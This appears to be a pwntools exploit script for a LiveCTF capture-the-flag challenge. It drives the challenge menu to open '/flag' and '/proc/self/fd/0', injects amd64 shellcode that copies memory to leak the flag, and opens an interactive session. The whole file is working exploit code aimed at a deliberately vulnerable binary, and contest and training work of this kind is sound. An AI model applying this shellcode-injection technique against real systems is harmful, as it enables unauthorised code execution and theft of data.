from pwn import *
import sys

if len(sys.argv) >= 2:
  p = process('../chall-2/handout/challenge')
else:
  HOST = os.environ.get('HOST', 'localhost')
  PORT = 31337

  p = remote(HOST, int(PORT))


context.log_level='debug'


p.sendlineafter(': ', '1')
p.sendlineafter('> ', '/flag')


p.sendlineafter(': ', '1')
p.sendlineafter('> ', '/proc/self/fd/0')

context.arch='amd64'

code = shellcraft.amd64.brk()
code = shellcraft.amd64.read(1, 'rax', 400)
print(len(asm(code)))
p.sendline(asm(code))

p.sendlineafter(': ', '1')
p.sendlineafter('> ', '/proc/self/fd/0')

context.arch='amd64'

code = '''
sub rdx, 0x2000
sub r13, 0x1B29
add r13, 0x4030

mov r12, [rbp-0x28]
add r12, 0xc

mov rax, [rdx]
mov [r12], rax
'''

code += '''
add rdx, 8
add r12, 8
mov rax, [rdx]
mov [r12], rax
'''*13
# code += shellcraft.amd64.read(1, 'rax', 400)
print(len(asm(code)))
# pause()
p.sendline(asm(code))

p.sendlineafter(': ', '2')

p.interactive()


# p.sendline(b'./submitter')
# flag = p.recvline_contains(b'LiveCTF{').decode().strip()

# log.info('Flag: %s', flag)
